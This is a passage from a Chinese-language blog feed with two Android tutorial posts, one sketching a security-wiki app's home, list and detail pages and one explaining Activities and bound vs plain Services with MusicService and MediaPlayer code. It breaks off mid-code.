      <url>/2024/11/17/app%E5%A4%A7%E8%87%B4%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="主体思路"><a href="#主体思路" class="headerlink" title="主体思路"></a>主体思路</h4><p>   最近又接到安卓开发的任务要求，需要设计一个app的大致框架，需要带上首页，列表页，详情页。<br>   作为一个安全小鸡仔，肯定少不了想做一个和安全相关的app。因此大致思路就是依附于国外著名安全网站thm，做一个安全wiki 。</p><h5 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h5><p>主页加载gif</p><h4 id="具体展示"><a href="#具体展示" class="headerlink" title="具体展示"></a>具体展示</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/test.png" alt="test.png"></p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><h5 id="首页操作"><a href="#首页操作" class="headerlink" title="首页操作"></a>首页操作</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">build.gradle 中加载</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dependencies &#123;  </span><br><span class="line">    implementation <span class="string">&#x27;com.github.bumptech.glide:glide:4.15.0&#x27;</span> <span class="comment">// Glide 版本  </span></span><br><span class="line">    annotationProcessor <span class="string">&#x27;com.github.bumptech.glide:compiler:4.15.0&#x27;</span> <span class="comment">// Glide 编译器  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241115210950.png" alt="image.png"></p><p>按钮加载一个渐变色</p><p>在drawble中创建一个xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">shape</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 渐变背景 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">gradient</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:startColor</span>=<span class="string">&quot;#6A82FB&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:endColor</span>=<span class="string">&quot;#FC5C7D&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:angle</span>=<span class="string">&quot;45&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:type</span>=<span class="string">&quot;linear&quot;</span>/&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!-- 圆角 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">corners</span> <span class="attr">android:radius</span>=<span class="string">&quot;16dp&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 内边距 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">padding</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:left</span>=<span class="string">&quot;20dp&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:top</span>=<span class="string">&quot;12dp&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:right</span>=<span class="string">&quot;20dp&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">android:bottom</span>=<span class="string">&quot;12dp&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在按钮中加载<br>android:background&#x3D;”@drawable&#x2F;gradient_button”<br><strong>音乐</strong><br>普通服务直接使用mediaPlayer 创建音乐</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mediaPlayer=MediaPlayer.create(<span class="built_in">this</span>, R.raw._apt) ;</span><br><span class="line"><span class="keyword">if</span> (!mediaPlayer.isPlaying())&#123;</span><br><span class="line">    mediaPlayer.start(); <span class="comment">// 暂停音乐</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="列表页"><a href="#列表页" class="headerlink" title="列表页"></a>列表页</h5><p>首页跳转列表页<br>列表页采用三个按钮分别跳转</p><h5 id="详情页面"><a href="#详情页面" class="headerlink" title="详情页面"></a>详情页面</h5><p>framelayout 可以作为一个容器 展示fragment  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Fragment容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/fragment_container&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放置三个容器，分别注册三个fragment之后可以进行操作。<br>之后加入退回到堆栈的代码，就可以通过返回返回上一页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 确保将这个事务添加到回退栈中</span></span><br><span class="line">transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交事务</span></span><br><span class="line">transaction.commit(); </span><br></pre></td></tr></table></figure><h4 id="源码地址"><a href="#源码地址" class="headerlink" title="源码地址"></a>源码地址</h4><p><a href="https://github.com/k1t0111/app">https://github.com/k1t0111/app</a></p>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务</title>
      <link href="/2024/11/15/%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/11/15/%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h4 id="活动（Activity）"><a href="#活动（Activity）" class="headerlink" title="活动（Activity）"></a>活动（Activity）</h4><ul><li><strong>定义</strong>：Activity是一个可以通过用户直接交互的屏幕。它是用户与应用交互的窗口，可以包含各种视图（View）和视图组（ViewGroup）。</li><li><strong>生命周期</strong>：Activity具有丰富的生命周期，包括创建（onCreate）、启动（onStart）、运行（onResume）、暂停（onPause）、停止（onStop）和销毁（onDestroy）等状态。</li><li><strong>用户界面</strong>：Activity负责管理用户界面。每个Activity通常对应应用中的一个屏幕。</li><li><strong>交互</strong>：Activity可以直接与用户交互，响应用户的输入，如点击、滑动等。</li><li><strong>任务和回退栈</strong>：Activity通常被组织在任务和回退栈中，用户可以通过按下返回键来导航。</li></ul><h4 id="服务（Service）"><a href="#服务（Service）" class="headerlink" title="服务（Service）"></a>服务（Service）</h4><ul><li><strong>定义</strong>：Service是一个运行在后台，不提供直接用户界面的组件。它用于执行长时间运行的操作，或者为远程组件（如Activity）提供功能。</li><li><strong>生命周期</strong>：Service的生命周期比Activity简单，主要包括创建（onCreate）、绑定（onBind）、未绑定（onUnbind）、销毁（onDestroy）等状态。</li><li><strong>后台任务</strong>：Service适合执行不需要用户直接交互的后台任务，如播放音乐、处理文件、执行网络请求等。</li><li><strong>绑定和通信</strong>：Service可以通过绑定机制与Activity通信。Activity可以通过调用Service的<code>bindService</code>方法来绑定Service，并使用回调接口（Binder）与Service进行交互。</li><li><strong>前台和后台</strong>：Service可以运行在前台或后台。前台Service通常会显示一个持续的通知，以便用户知道Service正在运行。</li></ul><h4 id="服务周期"><a href="#服务周期" class="headerlink" title="服务周期"></a>服务周期</h4><h5 id="绑定式服务"><a href="#绑定式服务" class="headerlink" title="绑定式服务"></a>绑定式服务</h5><ul><li><strong>绑定服务（Bound Service）</strong>：允许应用的组件（如<code>Activity</code>）与服务进行通信，直接与服务交互。常用于需要长时间运行且需要频繁与应用组件交互的任务，比如播放音乐。</li></ul><p>首先与普通服务不一样，绑定服务需要有一个服务类，内部封装了我们需要的一些操作。通过服务与活动的通信进行操作。</p><p><em><strong>一定要先注册服务</strong></em></p><p><strong>服务</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span>  com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.media.MediaPlayer;</span><br><span class="line"><span class="keyword">import</span> android.os.Binder;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MusicService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MusicBinder</span>();</span><br><span class="line">    <span class="keyword">private</span> MediaPlayer mediaPlayer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个Binder对象，用于Activity与Service通信</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MusicBinder</span> <span class="keyword">extends</span> <span class="title class_">Binder</span> &#123;</span><br><span class="line">        MusicService <span class="title function_">getService</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> MusicService.<span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> binder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate();</span><br><span class="line">        mediaPlayer = MediaPlayer.create(<span class="built_in">this</span>, R.raw._apt); <span class="comment">// 初始化音乐播放器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="keyword">if</span> (mediaPlayer != <span class="literal">null</span>) &#123;</span><br><span class="line">            mediaPlayer.release(); <span class="comment">// 释放资源</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 播放音乐</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">playMusic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mediaPlayer != <span class="literal">null</span> &amp;&amp; !mediaPlayer.isPlaying()) &#123;</span><br><span class="line">            mediaPlayer.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 暂停音乐</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pauseMusic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mediaPlayer != <span class="literal">null</span> &amp;&amp; mediaPlayer.isPlaying()) &#123;</span><br><span class="line">            mediaPlayer.pause();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 停止音乐</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stopMusic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mediaPlayer != <span class="literal">null</span> &amp;&amp; mediaPlayer.isPlaying()) &#123;</span><br><span class="line">            mediaPlayer.stop();</span><br><span class="line">            mediaPlayer.prepareAsync(); <span class="comment">// 为下一次播放做准备</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互的b 活动 内部注释很清楚 无非就是服务类封装了所有操作，调用服务类的方法和属性作为接口进行相关活动操作。 就是要绑定这一点有点特殊</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageButton;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;</span><br><span class="line"><span class="keyword">import</span> android.content.ServiceConnection;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity_B</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建私有服务对象</span></span><br><span class="line">    <span class="keyword">private</span> MusicService musicService;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">isBound</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个ServiceConnection对象，绑定和解绑服务</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">ServiceConnection</span> <span class="variable">serviceConnection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">            MusicService.<span class="type">MusicBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (MusicService.MusicBinder) service;</span><br><span class="line">            musicService = binder.getService();</span><br><span class="line">            isBound = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">            isBound = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main_b);</span><br><span class="line"></span><br><span class="line">        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -&gt; &#123;</span><br><span class="line">            <span class="type">Insets</span> <span class="variable">systemBars</span> <span class="operator">=</span> insets.getInsets(WindowInsetsCompat.Type.systemBars());</span><br><span class="line">            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);</span><br><span class="line">            <span class="keyword">return</span> insets;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取从 Activity A 传来的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="comment">// 处理数据 发送的数据</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">myTextView1</span> <span class="operator">=</span> findViewById(R.id.textView3);</span><br><span class="line">        myTextView1.setText(value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绑定播放按钮</span></span><br><span class="line">        <span class="type">ImageButton</span> <span class="variable">button_play</span> <span class="operator">=</span> findViewById(R.id.imageButton);</span><br><span class="line">        <span class="type">ImageButton</span> <span class="variable">button_stop</span> <span class="operator">=</span> findViewById(R.id.imageButton6);</span><br><span class="line"></span><br><span class="line">        button_play.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 判断是否绑定</span></span><br><span class="line">                <span class="keyword">if</span> (isBound) &#123;</span><br><span class="line">                    musicService.playMusic(); <span class="comment">// 播放音乐</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        button_stop.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 判断是否绑定</span></span><br><span class="line">                <span class="keyword">if</span> (isBound) &#123;</span><br><span class="line">                    musicService.pauseMusic(); <span class="comment">// 暂停音乐</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStart</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStart();</span><br><span class="line">        Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;B_onStart called&quot;</span>);</span><br><span class="line">        <span class="comment">// 在开始的时候 绑定好服务</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, MusicService.class);</span><br><span class="line">        bindService(intent, serviceConnection, BIND_AUTO_CREATE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;B_onDestroy called&quot;</span>);</span><br><span class="line">        <span class="comment">// 在销毁时解绑服务，防止内存泄漏</span></span><br><span class="line">        <span class="keyword">if</span> (isBound) &#123;</span><br><span class="line">            unbindService(serviceConnection);</span><br><span class="line">            isBound = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onStop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onStop();</span><br><span class="line">        Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;B_onStop called&quot;</span>);</span><br><span class="line">        <span class="comment">// 在停止时解绑服务</span></span><br><span class="line">        <span class="keyword">if</span> (isBound) &#123;</span><br><span class="line">            unbindService(serviceConnection);</span><br><span class="line">            isBound = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPause();</span><br><span class="line">        Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;B_onPause called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onResume();</span><br><span class="line">        Log.d(<span class="string">&quot;ActivityLifecycle&quot;</span>, <span class="string">&quot;B_onResume called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="普通服务"><a href="#普通服务" class="headerlink" title="普通服务"></a>普通服务</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity_B</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MediaPlayer mediaPlayer;  <span class="comment">// 播放器 对象</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main_b);</span><br><span class="line">        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -&gt; &#123;</span><br><span class="line">            <span class="type">Insets</span> <span class="variable">systemBars</span> <span class="operator">=</span> insets.getInsets(WindowInsetsCompat.Type.systemBars());</span><br><span class="line">            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);</span><br><span class="line">            <span class="keyword">return</span> insets;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 创建一个 播放器绑定</span></span><br><span class="line">        mediaPlayer = MediaPlayer.create(<span class="built_in">this</span>, R.raw._apt);</span><br><span class="line">        <span class="comment">// 获取从 Activity A 传来的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理数据 发送的数据</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">myTextView1</span> <span class="operator">=</span> findViewById(R.id.textView3);</span><br><span class="line">        <span class="comment">// 接收a发来的 讯息</span></span><br><span class="line">        myTextView1.setText(value);</span><br><span class="line">        <span class="comment">// 绑定播放按钮</span></span><br><span class="line">        ImageButton button_play=findViewById(R.id.imageButton);</span><br><span class="line">        ImageButton button_stop=findViewById(R.id.imageButton6);</span><br><span class="line">        button_play.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 判断是否没在播放音乐</span></span><br><span class="line">                <span class="keyword">if</span> (!mediaPlayer.isPlaying()) &#123;</span><br><span class="line">                    mediaPlayer.start(); <span class="comment">// 